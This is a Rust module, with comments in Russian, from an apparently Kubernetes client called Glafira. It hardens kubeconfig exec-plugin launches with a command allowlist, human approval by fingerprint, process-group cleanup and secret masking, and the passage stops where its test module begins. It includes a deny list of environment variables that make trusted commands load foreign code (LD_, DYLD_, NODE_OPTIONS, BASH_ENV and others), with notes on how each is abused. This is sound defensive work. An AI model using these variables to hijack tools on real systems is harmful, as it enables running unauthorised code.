//! Exec-плагины kubeconfig (спец. §5.2): список разрешённых команд, путь к команде, строка запуска
//! и её подтверждение человеком, запуск и учётные данные. Glafira запускает только команды из
//! списка, по абсолютному пути и без оболочки; плагин запускает Glafira, а не `kube`: в `kube`
//! запуск блокирующий, без таймаута и отмены, а текст ошибки содержит переменные окружения.

use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::time::{Duration, SystemTime};

use base64::Engine;
use base64::engine::general_purpose::STANDARD;
use secrecy::SecretString;
use sha2::{Digest, Sha256};
use tokio::sync::oneshot;

use crate::error::{AppError, AppResult, ErrorCode};
use crate::i18n::LocalizedText;
use crate::storage::profile::{
    AuthConfig, CaConfig, ConnectionProfile, ExecAuth, ExecEnv, ProxyConfig,
};

/// Разрешённая команда exec-плагина (спец. §5.2).
pub struct AllowedCommand {
    /// Имя исполняемого файла.
    pub name: &'static str,
    /// Первые позиционные аргументы; пустой список — любые аргументы.
    pub args: &'static [&'static str],
    /// Ключи, допустимые перед `args`; `None` — ключей перед `args` нет вовсе.
    pub leading: Option<LeadingOptions>,
}

/// Ведущие ключи разрешённой команды (перед её первыми аргументами). Ключ из `values` берёт
/// значение следующим элементом (`--ключ значение`) или после `=`; ключ из `flags` — флаг без
/// значения и без `=`. Любой другой ведущий ключ — отказ, в том числе `--`, `-` и сокращения
/// argparse (`aws --reg`): подкоманда, которую запустит утилита, не должна зависеть от того,
/// как утилита разбирает незнакомый ключ. Здесь только документированные глобальные ключи:
/// ключа нет — редкая строка получает отказ с его именем.
pub struct LeadingOptions {
    pub values: &'static [&'static str],
    pub flags: &'static [&'static str],
    /// `_` в имени ключа — то же, что `-` (`--request_timeout` = `--request-timeout`): так
    /// разбирает ключи oc (cobra с `WordSepNormalizeFunc`).
    pub underscore_is_dash: bool,
}

/// Вид ведущего ключа.
#[derive(Clone, Copy)]
enum Leading {
    Value,
    Flag,
}

impl LeadingOptions {
    /// Вид ключа по имени (без `=значение`); `None` — ключ незнаком.
    fn kind(&self, option: &str) -> Option<Leading> {
        let option = if self.underscore_is_dash {
            option.replace('_', "-")
        } else {
            option.to_string()
        };
        if self.values.contains(&option.as_str()) {
            Some(Leading::Value)
        } else if self.flags.contains(&option.as_str()) {
            Some(Leading::Flag)
        } else {
            None
        }
    }
}

/// Глобальные ключи oc со значением (`oc options`).
const OC_VALUES: &[&str] = &[
    "--as",
    "--as-group",
    "--as-uid",
    "--cache-dir",
    "--certificate-authority",
    "--client-certificate",
    "--client-key",
    "--cluster",
    "--context",
    "--kubeconfig",
    "--log-flush-frequency",
    "--loglevel",
    "-n",
    "--namespace",
    "--profile",
    "--profile-output",
    "--request-timeout",
    "-s",
    "--server",
    "--tls-server-name",
    "--token",
    "--user",
    "-v",
    "--v",
    "--vmodule",
];

/// Глобальные флаги oc (`oc options`).
const OC_FLAGS: &[&str] = &[
    "--disable-compression",
    "--insecure-skip-tls-verify",
    "--match-server-version",
    "--warnings-as-errors",
];

/// Разрешённые команды: имя исполняемого файла, первые позиционные аргументы и ключи перед ними.
pub const ALLOWED: &[AllowedCommand] = &[
    // EKS. Ведущие ключи — Global Options из `aws help`.
    AllowedCommand {
        name: "aws",
        args: &["eks", "get-token"],
        leading: Some(LeadingOptions {
            values: &[
                "--ca-bundle",
                "--cli-connect-timeout",
                "--cli-read-timeout",
                "--color",
                "--endpoint-url",
                "--output",
                "--profile",
                "--query",
                "--region",
            ],
            flags: &[
                "--cli-auto-prompt",
                "--debug",
                "--no-cli-auto-prompt",
                "--no-cli-pager",
                "--no-paginate",
                "--no-sign-request",
                "--no-verify-ssl",
            ],
            underscore_is_dash: false,
        }),
    },
    // EKS, старые kubeconfig. Глобальные ключи корневой команды: `-c/--config`, `-i/--cluster-id`,
    // `-l/--log-format`.
    AllowedCommand {
        name: "aws-iam-authenticator",
        args: &["token"],
        leading: Some(LeadingOptions {
            values: &["-c", "--config", "-i", "--cluster-id", "-l", "--log-format"],
            flags: &[],
            underscore_is_dash: false,
        }),
    },
    // GKE: любые аргументы.
    AllowedCommand {
        name: "gke-gcloud-auth-plugin",
        args: &[],
        leading: None,
    },
    // AKS (Azure kubelogin) и OIDC (int128/kubelogin). Глобальный ключ у обоих — уровень журнала
    // `-v/--v`.
    AllowedCommand {
        name: "kubelogin",
        args: &["get-token"],
        leading: Some(LeadingOptions {
            values: &["-v", "--v"],
            flags: &[],
            underscore_is_dash: false,
        }),
    },
    // OIDC: Keycloak, Dex (в том числе Deckhouse). Ключей перед `oidc-login` нет: с ними kubectl
    // плагин не запускает («flags cannot be placed before plugin name»), а флаг перед встроенной
    // командой запустил бы её (`kubectl --insecure-skip-tls-verify exec …`).
    AllowedCommand {
        name: "kubectl",
        args: &["oidc-login", "get-token"],
        leading: None,
    },
    // OpenShift с внешним OIDC (ROSA HCP с external auth).
    AllowedCommand {
        name: "oc",
        args: &["get-token"],
        leading: Some(LeadingOptions {
            values: OC_VALUES,
            flags: OC_FLAGS,
            underscore_is_dash: true,
        }),
    },
    // Yandex Managed Kubernetes. Ведущие ключи — Global Flags из `yc --help`.
    AllowedCommand {
        name: "yc",
        args: &["k8s", "create-token"],
        leading: Some(LeadingOptions {
            values: &[
                "--cloud-id",
                "--endpoint",
                "--folder-id",
                "--folder-name",
                "--format",
                "--profile",
                "--retry",
                "--token",
            ],
            flags: &["--debug", "--no-user-output"],
            underscore_is_dash: false,
        }),
    },
    // Rancher без генерации токенов в kubeconfig. Глобальные ключи: `--config, -c` и `--debug`;
    // ключи разбирает Go `flag`, где один и два дефиса равны.
    AllowedCommand {
        name: "rancher",
        args: &["token"],
        leading: Some(LeadingOptions {
            values: &["-c", "--c", "-config", "--config"],
            flags: &["-debug", "--debug"],
            underscore_is_dash: false,
        }),
    },
];

/// Имя исполняемого файла без каталога и `.exe`; на Windows — без учёта регистра.
pub fn command_name(command: &str) -> String {
    let name = Path::new(command)
        .file_name()
        .map(|n| n.to_string_lossy().to_string())
        .unwrap_or_default();
    let name = if cfg!(windows) {
        name.to_lowercase()
    } else {
        name
    };
    match name.len().checked_sub(4) {
        Some(i) if name.is_char_boundary(i) && name[i..].eq_ignore_ascii_case(".exe") => {
            name[..i].to_string()
        }
        _ => name,
    }
}

/// Разрешена ли команда: имя файла из `ALLOWED`, перед первыми аргументами — только ключи
/// из таблицы команды (`LeadingOptions`), затем сами аргументы. В тексте отказа — имя ключа без
/// значения: значение после `=` бывает секретом.
pub fn check_allowed(command: &str, args: &[String]) -> Result<(), LocalizedText> {
    let name = command_name(command);
    let Some(cmd) = ALLOWED.iter().find(|c| c.name == name) else {
        return Err(ltext!(
            "errors.exec.notAllowed",
            "“{{command}}” is not in the list of allowed exec plugins",
            command = name
        ));
    };
    let prefix = cmd.args;
    let Some(&subcommand) = prefix.first() else {
        return Ok(());
    };
    let expected = std::iter::once(name.as_str())
        .chain(prefix.iter().copied())
        .collect::<Vec<_>>()
        .join(" ");
    let mut i = 0;
    while let Some(a) = args.get(i).filter(|a| a.starts_with('-')) {
        let (option, inline) = match a.split_once('=') {
            Some((option, _)) => (option, true),
            None => (a.as_str(), false),
        };
        let Some(leading) = &cmd.leading else {
            return Err(ltext!(
                "errors.exec.optionBeforePlugin",
                "“{{command}}” starts the plugin “{{subcommand}}” only without options before it: put “{{option}}” after “{{expected}}” or remove it",
                command = name,
                subcommand = subcommand,
                option = option,
                expected = expected
            ));
        };
        i += match (leading.kind(option), inline) {
            (Some(Leading::Value), false) => 2,
            (Some(Leading::Value), true) | (Some(Leading::Flag), false) => 1,
            (Some(Leading::Flag), true) => {
                return Err(ltext!(
                    "errors.exec.flagWithValue",
                    "The option “{{option}}” of “{{command}}” before “{{subcommand}}” is a flag: write it without “=”",
                    option = option,
                    command = name,
                    subcommand = subcommand
                ));
            }
            (None, _) => {
                return Err(ltext!(
                    "errors.exec.unknownOption",
                    "Glafira does not know the option “{{option}}” of “{{command}}” before “{{subcommand}}”: put it after “{{expected}}” or remove it",
                    option = option,
                    command = name,
                    subcommand = subcommand,
                    expected = expected
                ));
            }
        };
    }
    let pos = &args[i.min(args.len())..];
    if pos.len() >= prefix.len() && prefix.iter().zip(pos).all(|(p, a)| p == a) {
        return Ok(());
    }
    Err(ltext!(
        "errors.exec.argsNotAllowed",
        "The exec plugin “{{command}}” may run only as “{{expected}} …”",
        command = name,
        expected = expected
    ))
}

/// Переменные окружения, которые меняют, какой код запустит любая команда: путь поиска команд и
/// библиотек и код, который при старте загружают загрузчик, интерпретаторы и оболочки. С ними
/// команда из списка разрешённых запустила бы чужой код. `PATH` процесса плагина задаёт Glafira
/// (`plugin_path`). Переменные настройки самой утилиты (`AWS_PROFILE`, `AWS_CONFIG_FILE`) не
/// запрещены: они видны в подтверждённой строке запуска.
const FORBIDDEN_ENV: &[&str] = &[
    "PATH",
    "GCONV_PATH",
    "NODE_OPTIONS",
    "NODE_PATH",
    "PERL5LIB",
    "PERL5OPT",
    "PERLLIB",
    "RUBYOPT",
    "RUBYLIB",
    "BASH_ENV",
    "ENV",
    // `xtrace` из SHELLOPTS выполняет подстановки в `PS4`.
    "SHELLOPTS",
    "JAVA_TOOL_OPTIONS",
    "_JAVA_OPTIONS",
    "JDK_JAVA_OPTIONS",
    // Windows: по PATHEXT ищутся обёртки `.cmd` в цепочке плагина (`gcloud` у
    // gke-gcloud-auth-plugin), COMSPEC их запускает.
    "PATHEXT",
    "COMSPEC",
];

/// Начала имён запрещённых переменных: загрузчики Linux и macOS, все переменные Python (`python -E`
/// не читает ни одной из них) и функции, которые bash импортирует из окружения.
const FORBIDDEN_ENV_PREFIXES: &[&str] = &["LD_", "DYLD_", "PYTHON", "BASH_FUNC_"];

/// Запрещена ли переменная окружения в профиле exec-плагина. На Windows имена переменных не
/// различают регистр (`Path` — это `PATH`).
pub fn is_forbidden_env(name: &str) -> bool {
    let name = if cfg!(windows) {
        name.to_uppercase()
    } else {
        name.to_string()
    };
    FORBIDDEN_ENV.contains(&name.as_str())
        || FORBIDDEN_ENV_PREFIXES.iter().any(|p| name.starts_with(p))
}

/// Первая запрещённая переменная окружения (`is_forbidden_env`). Проверяется везде, где список
/// разрешённых команд: при сохранении и импорте профиля, в предпросмотре kubeconfig и при запуске.
pub fn check_env(env: &[ExecEnv]) -> Result<(), LocalizedText> {
    match env.iter().find(|v| is_forbidden_env(&v.name)) {
        Some(v) => Err(ltext!(
            "errors.exec.envForbidden",
            "“{{name}}” is not allowed in the exec plugin environment: the variable can make the command load or run other code",
            name = v.name
        )),
        None => Ok(()),
    }
}

/// Похоже ли имя переменной окружения или ключа командной строки на секрет: такие значения
/// не показываются и не экспортируются. `PASS` покрывает PASSWORD, PASSWD и PASSPHRASE.
pub fn is_secret_name(name: &str) -> bool {
    let n = name.to_ascii_uppercase();
    [
        "TOKEN",
        "SECRET",
        "PASS",
        "KEY",
        "BEARER",
        "COOKIE",
        "CREDENTIAL",
    ]
    .iter()
    .any(|w| n.contains(w))
}

/// Место значения секретного аргумента в списке аргументов.
struct SecretArg {
    /// Имя ключа без ведущих дефисов.
    flag: String,
    /// Номер элемента списка, в котором лежит значение.
    index: usize,
    /// `--имя=значение`: значение — часть того же элемента после `=`; иначе (`--имя значение`) —
    /// отдельный следующий элемент.
    inline: bool,
}

impl SecretArg {
    fn value<'a>(&self, args: &'a [String]) -> &'a str {
        let a = args[self.index].as_str();
        if self.inline {
            a.split_once('=').map_or("", |(_, v)| v)
        } else {
            a
        }
    }

    fn set(&self, args: &mut [String], value: &str) {
        let a = &mut args[self.index];
        if self.inline {
            let keep = a.find('=').map_or(a.len(), |i| i + 1);
            a.truncate(keep);
            a.push_str(value);
        } else {
            *a = value.to_string();
        }
    }
}

/// Секретные аргументы: `--имя=значение` или пара `--имя значение`, где имя ключа без ведущих
/// дефисов подходит под `is_secret_name` (`--oidc-client-secret=…` у kubectl oidc-login,
/// `--client-secret …` у Azure kubelogin). Значением пары считается следующий элемент, каким бы
/// он ни был; ключ без значения в конце списка ничего не скрывает.
fn secret_args(args: &[String]) -> Vec<SecretArg> {
    let mut out = Vec::new();
    let mut i = 0;
    while i < args.len() {
        let a = &args[i];
        i += 1;
        if !a.starts_with('-') {
            continue;
        }
        let (name, inline) = match a.split_once('=') {
            Some((name, _)) => (name, true),
            None => (a.as_str(), false),
        };
        let flag = name.trim_start_matches('-');
        if !is_secret_name(flag) {
            continue;
        }
        if inline {
            out.push(SecretArg {
                flag: flag.to_string(),
                index: i - 1,
                inline,
            });
        } else if i < args.len() {
            out.push(SecretArg {
                flag: flag.to_string(),
                index: i,
                inline,
            });
            i += 1;
        }
    }
    out
}

/// Аргументы, в которых значения секретных ключей заменены на `mask`.
pub fn mask_secret_args(args: &[String], mask: &str) -> Vec<String> {
    let mut out = args.to_vec();
    for slot in secret_args(args) {
        slot.set(&mut out, mask);
    }
    out
}

/// Аргументы без значений секретных ключей (для экспорта): `--имя=значение` становится `--имя=`,
/// в паре `--имя значение` значение становится пустой строкой.
pub fn blank_secret_args(args: &[String]) -> Vec<String> {
    mask_secret_args(args, "")
}

/// Все секретные значения exec-плагина: переменные окружения с секретными именами и значения
/// секретных аргументов; пустые пропускаются. По ним маскируется вывод плагина.
pub fn secret_values(e: &ExecAuth) -> Vec<String> {
    let env = e
        .env
        .iter()
        .filter(|v| is_secret_name(&v.name))
        .map(|v| v.value.clone());
    let from_args = secret_args(&e.args)
        .into_iter()
        .map(|slot| slot.value(&e.args).to_string());
    env.chain(from_args).filter(|v| !v.is_empty()).collect()
}

/// Подставляет локальные секреты туда, где во входящем плагине значение пустое: файл обмена
/// секретов не несёт, а обновление подключения не должно их стирать. Переменные сопоставляются
/// по имени, аргументы — по имени ключа; непустое значение из файла остаётся как есть.
pub fn inherit_secrets(incoming: &mut ExecAuth, local: &ExecAuth) {
    for v in &mut incoming.env {
        if v.value.is_empty()
            && is_secret_name(&v.name)
            && let Some(l) = local.env.iter().find(|l| l.name == v.name)
        {
            v.value.clone_from(&l.value);
        }
    }
    let local_slots = secret_args(&local.args);
    for slot in secret_args(&incoming.args) {
        if slot.value(&incoming.args).is_empty()
            && let Some(l) = local_slots.iter().find(|l| l.flag == slot.flag)
        {
            slot.set(&mut incoming.args, l.value(&local.args));
        }
    }
}

/// Отпечаток строки запуска: путь, аргументы, переменные окружения, версия API и
/// `provideClusterInfo`. Подтверждение человека хранится как этот отпечаток.
pub fn fingerprint(e: &ExecAuth) -> String {
    let env: Vec<(&str, &str)> = e
        .env
        .iter()
        .map(|v| (v.name.as_str(), v.value.as_str()))
        .collect();
    let canonical = serde_json::to_vec(&(
        &e.command,
        &e.args,
        env,
        &e.api_version,
        e.provide_cluster_info,
    ))
    .expect("serializable");
    Sha256::digest(&canonical)
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect()
}

/// Подтверждена ли человеком именно эта строка запуска.
pub fn is_approved(e: &ExecAuth) -> bool {
    e.approved.as_deref() == Some(fingerprint(e).as_str())
}

/// Плагин без подтверждённой строки запуска не запускается ни при подключении, ни при проверке
/// подключения (спец. §5.2): единственное место, где строится эта ошибка.
pub fn require_approved(e: &ExecAuth) -> AppResult<()> {
    if is_approved(e) {
        return Ok(());
    }
    Err(app_err!(
        ErrorCode::AuthFailed,
        "errors.exec.notApproved",
        "Confirm the exec plugin launch line in the connection settings"
    ))
}

/// Отказ для команды без абсолютного пути: при сохранении профиля и при запуске плагина.
pub fn command_not_absolute(command: &str) -> LocalizedText {
    ltext!(
        "errors.exec.commandNotAbsolute",
        "Specify the full path to “{{command}}” — use “Find”",
        command = command
    )
}

/// Стандартные каталоги команд, которых может не быть в PATH приложения: Homebrew,
/// `/usr/local/bin`, `~/.local/bin`; на Windows — ярлыки winget и `%LOCALAPPDATA%`.
pub fn standard_dirs(home: Option<&Path>, local_app_data: Option<&Path>) -> Vec<PathBuf> {
    if cfg!(windows) {
        local_app_data
            .map(|d| {
                vec![
                    d.join("Microsoft").join("WinGet").join("Links"),
                    d.to_path_buf(),
                ]
            })
            .unwrap_or_default()
    } else {
        let mut dirs = vec![
            PathBuf::from("/opt/homebrew/bin"),
            PathBuf::from("/usr/local/bin"),
        ];
        if let Some(h) = home {
            dirs.push(h.join(".local").join("bin"));
        }
        dirs
    }
}

/// Где искать команду: каталоги PATH (оболочки входа или процесса), затем стандартные; без повторов.
/// Только абсолютные каталоги: `.` или `bin` в PATH означали бы запуск того, что лежит в рабочем
/// каталоге, а `resolve_command` обязан вернуть абсолютный путь.
pub fn search_dirs(path_var: Option<&str>, standard: Vec<PathBuf>) -> Vec<PathBuf> {
    let mut out: Vec<PathBuf> = Vec::new();
    let from_path = path_var
        .map(|p| std::env::split_paths(p).collect::<Vec<_>>())
        .unwrap_or_default();
    for d in from_path.into_iter().chain(standard) {
        if d.is_absolute() && !out.contains(&d) {
            out.push(d);
        }
    }
    out
}

/// Абсолютный путь к команде: абсолютный путь — как есть, относительный путь с каталогом —
/// от каталога kubeconfig (`base`, как у kubectl), имя — поиском по `dirs`. `None` — не найдена.
pub fn resolve_command(
    command: &str,
    base: Option<&Path>,
    dirs: &[PathBuf],
    is_file: &dyn Fn(&Path) -> bool,
) -> Option<PathBuf> {
    let p = Path::new(command.trim());
    if p.as_os_str().is_empty() {
        return None;
    }
    if p.is_absolute() {
        return is_file(p).then(|| p.to_path_buf());
    }
    if p.components().count() > 1 {
        return base
            .map(|b| b.join(p))
            .filter(|c| c.is_absolute() && is_file(c));
    }
    dirs.iter().find_map(|d| {
        let mut candidates = vec![d.join(p)];
        if cfg!(windows) && p.extension().is_none() {
            candidates.push(d.join(format!("{}.exe", p.display())));
        }
        candidates.into_iter().find(|c| is_file(c))
    })
}

/// Обычный файл, который можно запустить как команду: на unix — с правом исполнения (иначе
/// `kubelogin` без права `x` в раннем каталоге PATH закрыл бы настоящий в позднем), на остальных
/// системах — любой файл. Предикат для `resolve_command`; делает `stat`, поэтому вызывается
/// не на async-потоке.
pub fn is_executable_file(p: &Path) -> bool {
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::metadata(p).is_ok_and(|m| m.is_file() && m.permissions().mode() & 0o111 != 0)
    }
    #[cfg(not(unix))]
    {
        p.is_file()
    }
}

/// Файл для тестов поиска команд: на unix — с правами `mode`, на остальных системах — обычный.
#[cfg(test)]
pub(crate) fn write_test_file(path: &Path, mode: u32) {
    std::fs::write(path, "#!/bin/sh\n").unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(path, std::fs::Permissions::from_mode(mode)).unwrap();
    }
    #[cfg(not(unix))]
    let _ = mode;
}

/// Учётные данные от плагина: токен или клиентский сертификат и срок действия.
#[derive(Debug, Clone)]
pub struct PluginCredential {
    pub token: Option<SecretString>,
    pub client_certificate_pem: Option<String>,
    pub client_key_pem: Option<SecretString>,
    /// `expirationTimestamp`: до этого времени Glafira не запускает плагин снова.
    pub expires_at: Option<SystemTime>,
}

type JsonObject = serde_json::Map<String, serde_json::Value>;

/// Вид значения JSON для причины отказа: само значение в текст не попадает.
fn json_kind(v: &serde_json::Value) -> &'static str {
    use serde_json::Value;
    match v {
        Value::Null => "null",
        Value::Bool(_) => "a boolean",
        Value::Number(_) => "a number",
        Value::String(_) => "a string",
        Value::Array(_) => "an array",
        Value::Object(_) => "an object",
    }
}

/// Строковое поле `status`; поле другого вида — причина с путём поля, но без значения.
fn status_str(status: &JsonObject, key: &str) -> Result<Option<String>, String> {
    use serde_json::Value;
    match status.get(key) {
        None | Some(Value::Null) => Ok(None),
        Some(Value::String(s)) => Ok(Some(s.clone())),
        Some(other) => Err(format!(
            "status.{key}: expected a string, got {}",
            json_kind(other)
        )),
    }
}

/// Разбор `ExecCredential` из вывода плагина. Ошибка — причина без содержимого вывода: ошибка
/// `serde` повторяет не подошедшее по типу значение (`invalid type: string "…"`), а в выводе
/// плагина именно токены, поэтому JSON разбирается как дерево и причина называет только поле
/// и вид значения.
pub fn parse_credential(stdout: &[u8]) -> Result<PluginCredential, String> {
    use serde_json::Value;
    let out: Value =
        serde_json::from_slice(stdout).map_err(|e| format!("the output is not valid JSON: {e}"))?;
    let Value::Object(out) = out else {
        return Err("the output is not a JSON object".into());
    };
    let s = match out.get("status") {
        None | Some(Value::Null) => return Err("no status in ExecCredential".into()),
        Some(Value::Object(s)) => s,
        Some(other) => {
            return Err(format!(
                "status: expected an object, got {}",
                json_kind(other)
            ));
        }
    };
    let expires_at = status_str(s, "expirationTimestamp")?
        .map(|ts| {
            time::OffsetDateTime::parse(&ts, &time::format_description::well_known::Rfc3339)
                .map(SystemTime::from)
                .map_err(|_| "status.expirationTimestamp: not an RFC 3339 timestamp".to_string())
        })
        .transpose()?;
    let token = status_str(s, "token")?
        .map(|t| t.trim().to_string())
        .filter(|t| !t.is_empty());
    let cert = status_str(s, "clientCertificateData")?.filter(|c| !c.trim().is_empty());
    let key = status_str(s, "clientKeyData")?.filter(|k| !k.trim().is_empty());
    if token.is_none() && (cert.is_none() || key.is_none()) {
        return Err("neither token nor clientCertificateData and clientKeyData".into());
    }
    Ok(PluginCredential {
        token: token.map(SecretString::from),
        client_certificate_pem: cert,
        client_key_pem: key.map(SecretString::from),
        expires_at,
    })
}

/// Вывод плагина для сообщения об ошибке: без токенов (JWT, `sha256~…`, `Bearer …`) и значений
/// переменных, похожих на секреты; не длиннее 2000 символов (хвост — там обычно причина).
pub fn mask_output(text: &str, secrets: &[&str]) -> String {
    let mut out = text.to_string();
    for s in secrets.iter().filter(|s| s.len() >= 4) {
        out = out.replace(s, "***");
    }
    let jwt = regex::Regex::new(r"eyJ[A-Za-z0-9_-]{4,}\.[A-Za-z0-9_-]{4,}\.[A-Za-z0-9_-]*")
        .expect("valid regex");
    let sha = regex::Regex::new(r"sha256~[A-Za-z0-9_-]+").expect("valid regex");
    let bearer = regex::Regex::new(r"(?i)(bearer\s+)\S+").expect("valid regex");
    out = jwt.replace_all(&out, "***").into_owned();
    out = sha.replace_all(&out, "sha256~***").into_owned();
    out = bearer.replace_all(&out, "${1}***").into_owned();
    let chars: Vec<char> = out.trim().chars().collect();
    if chars.len() > 2000 {
        format!(
            "…{}",
            chars[chars.len() - 2000..].iter().collect::<String>()
        )
    } else {
        chars.into_iter().collect()
    }
}

/// `KUBERNETES_EXEC_INFO` для плагина: версия API, `interactive: false` (терминала у приложения
/// нет) и, если `provideClusterInfo`, адрес, CA и прокси кластера.
pub fn exec_info(e: &ExecAuth, p: &ConnectionProfile) -> String {
    let mut spec = serde_json::json!({"interactive": false});
    if e.provide_cluster_info {
        let mut cluster = serde_json::json!({"server": p.api_url});
        match &p.ca {
            CaConfig::Pem { pem } => {
                cluster["certificate-authority-data"] = STANDARD.encode(pem).into();
            }
            CaConfig::Insecure => cluster["insecure-skip-tls-verify"] = true.into(),
            CaConfig::System => {}
        }
        if let Some(name) = &p.tls_server_name {
            cluster["tls-server-name"] = name.clone().into();
        }
        if let ProxyConfig::Url { url } = &p.proxy {
            cluster["proxy-url"] = url.clone().into();
        }
        spec["cluster"] = cluster;
    }
    serde_json::json!({"apiVersion": e.api_version, "kind": "ExecCredential", "spec": spec})
        .to_string()
}

const PATH_MARK: &str = "__GLAFIRA_PATH__";

/// PATH оболочки входа `shell` (`-l -c`): у приложения, запущенного из Dock, PATH короткий.
pub async fn shell_path(shell: &Path, limit: Duration) -> Option<String> {
    let mut cmd = tokio::process::Command::new(shell);
    cmd.args([
        "-l",
        "-c",
        r#"printf '__GLAFIRA_PATH__%s__GLAFIRA_PATH__' "$PATH""#,
    ])
    .stdin(Stdio::null())
    .stdout(Stdio::piped())
    .stderr(Stdio::null())
    .kill_on_drop(true);
    let out = tokio::time::timeout(limit, cmd.output()).await.ok()?.ok()?;
    let text = String::from_utf8_lossy(&out.stdout);
    let start = text.find(PATH_MARK)? + PATH_MARK.len();
    let end = start + text[start..].find(PATH_MARK)?;
    Some(text[start..end].to_string()).filter(|p| !p.is_empty())
}

static LOGIN_PATH: tokio::sync::OnceCell<Option<String>> = tokio::sync::OnceCell::const_new();

/// PATH оболочки входа пользователя (один раз за запуск); на Windows и при ошибке — `None`.
pub async fn login_shell_path() -> Option<String> {
    LOGIN_PATH
        .get_or_init(|| async {
            if cfg!(windows) {
                return None;
            }
            let shell = std::env::var("SHELL")
                .ok()
                .filter(|s| !s.trim().is_empty())
                .unwrap_or_else(|| "/bin/sh".into());
            shell_path(Path::new(&shell), Duration::from_secs(5)).await
        })
        .await
        .clone()
}

/// Каталоги поиска команд на этой машине: PATH оболочки входа (или процесса) и стандартные.
pub async fn command_dirs() -> Vec<PathBuf> {
    let path = match login_shell_path().await {
        Some(p) => Some(p),
        None => std::env::var("PATH").ok(),
    };
    let local = std::env::var_os("LOCALAPPDATA").map(PathBuf::from);
    search_dirs(
        path.as_deref(),
        standard_dirs(dirs::home_dir().as_deref(), local.as_deref()),
    )
}

/// PATH для процесса плагина: каталог самой команды и каталоги поиска (`kubectl oidc-login`
/// ищет `kubectl-oidc_login` в PATH, `kubelogin` — `az`).
fn plugin_path(command: &Path, dirs: &[PathBuf]) -> Option<String> {
    let own = command.parent().map(Path::to_path_buf);
    let all: Vec<&PathBuf> = own.iter().chain(dirs).collect();
    std::env::join_paths(all)
        .ok()
        .map(|p| p.to_string_lossy().to_string())
}

/// Группа процессов плагина (своя, `process_group(0)`). Если ожидание прервано (отмена, таймаут,
/// сбой), завершается вся группа: и плагин, и то, что он запустил (`sleep`, браузер,
/// вспомогательные процессы), — `kill_on_drop` завершил бы только сам плагин. Только на unix: на
/// Windows группы нет, и завершается только процесс плагина (`kill_on_drop`).
#[cfg(unix)]
struct PluginGroup(Option<u32>);

#[cfg(unix)]
impl PluginGroup {
    /// Плагин завершился сам: его группу не трогаем.
    fn release(mut self) {
        self.0 = None;
    }
}

#[cfg(unix)]
impl Drop for PluginGroup {
    fn drop(&mut self) {
        if let Some(pid) = self.0.and_then(|p| libc::pid_t::try_from(p).ok()) {
            // SAFETY: killpg только посылает сигнал группе, которую создали для плагина;
            // если её уже нет, вызов вернёт ESRCH.
            unsafe {
                libc::killpg(pid, libc::SIGKILL);
            }
        }
    }
}

/// Запускает плагин: без оболочки, `stdin` закрыт, не дольше `limit`; `cancel` прерывает
/// ожидание (как у входа через браузер). Процесс завершается вместе с ожиданием — на unix
/// вместе со всей своей группой (`PluginGroup`). Профиль могли
/// поправить в обход проверки, поэтому абсолютный путь, список разрешённых команд и запрещённые
/// переменные окружения проверяются и здесь. `path_env` — PATH процесса плагина.
pub async fn run(
    e: &ExecAuth,
    exec_info: &str,
    path_env: Option<&str>,
    cancel: oneshot::Receiver<()>,
    limit: Duration,
) -> AppResult<PluginCredential> {
    if !Path::new(&e.command).is_absolute() {
        return Err(AppError::localized(
            ErrorCode::AuthFailed,
            command_not_absolute(&e.command),
        ));
    }
    check_allowed(&e.command, &e.args)
        .and_then(|()| check_env(&e.env))
        .map_err(|t| AppError::localized(ErrorCode::AuthFailed, t))?;
    let name = command_name(&e.command);
    let mut cmd = tokio::process::Command::new(&e.command);
    cmd.args(&e.args)
        .envs(e.env.iter().map(|v| (&v.name, &v.value)))
        .env("KUBERNETES_EXEC_INFO", exec_info)
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .kill_on_drop(true);
    // Своего PATH в профиле нет (`check_env`): PATH плагина задаёт Glafira.
    if let Some(p) = path_env {
        cmd.env("PATH", p);
    }
    #[cfg(unix)]
    cmd.process_group(0);
    #[cfg(windows)]
    {
        // CREATE_NO_WINDOW: без мелькающего окна консоли.
        cmd.creation_flags(0x0800_0000);
    }
    let start_error = |err: std::io::Error| {
        app_err!(
            ErrorCode::AuthFailed,
            "errors.exec.start",
            "Cannot start the exec plugin {{command}}: {{error}}",
            command = name,
            error = err
        )
    };
    let child = cmd.spawn().map_err(start_error)?;
    #[cfg(unix)]
    let group = PluginGroup(child.id());
    let output = tokio::select! {
        out = child.wait_with_output() => out.map_err(start_error)?,
        _ = cancel => return Err(crate::auth::callback::cancelled()),
        _ = tokio::time::sleep(limit) => {
            return Err(app_err!(
                ErrorCode::Timeout,
                "errors.exec.timeout",
                "The exec plugin {{command}} did not finish in {{seconds}} s",
                command = name,
                seconds = limit.as_secs()
            ));
        }
    };
    #[cfg(unix)]
    group.release();
    // Значения секретных переменных и аргументов не попадают в текст ошибок.
    let secrets = secret_values(e);
    let secrets: Vec<&str> = secrets.iter().map(String::as_str).collect();
    if !output.status.success() {
        let code = output
            .status
            .code()
            .map_or_else(|| "—".to_string(), |c| c.to_string());
        return Err(app_err!(
            ErrorCode::AuthFailed,
            "errors.exec.failed",
            "The exec plugin {{command}} failed (exit code {{code}})",
            command = name,
            code = code
        )
        .with_details(mask_output(
            &String::from_utf8_lossy(&output.stderr),
            &secrets,
        )));
    }
    parse_credential(&output.stdout).map_err(|reason| {
        app_err!(
            ErrorCode::AuthFailed,
            "errors.exec.badOutput",
            "The exec plugin {{command}} returned no credentials",
            command = name
        )
        .with_details(mask_output(&reason, &secrets))
    })
}

/// Учётные данные подключения с exec-плагином: только по подтверждённой строке запуска
/// (спец. §5.2). Политику проверяет вызывающий код (`ensure_allowed`).
pub async fn credential_for(
    p: &ConnectionProfile,
    cancel: oneshot::Receiver<()>,
    limit: Duration,
) -> AppResult<PluginCredential> {
    let AuthConfig::Exec(e) = &p.auth else {
        return Err(AppError::internal_with("not an exec plugin connection"));
    };
    require_approved(e)?;
    let dirs = command_dirs().await;
    let path = plugin_path(Path::new(&e.command), &dirs);
    run(e, &exec_info(e, p), path.as_deref(), cancel, limit).await
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::storage::profile::sample_exec;

    fn args(list: &[&str]) -> Vec<String> {
        list.iter().map(|s| s.to_string()).collect()
    }

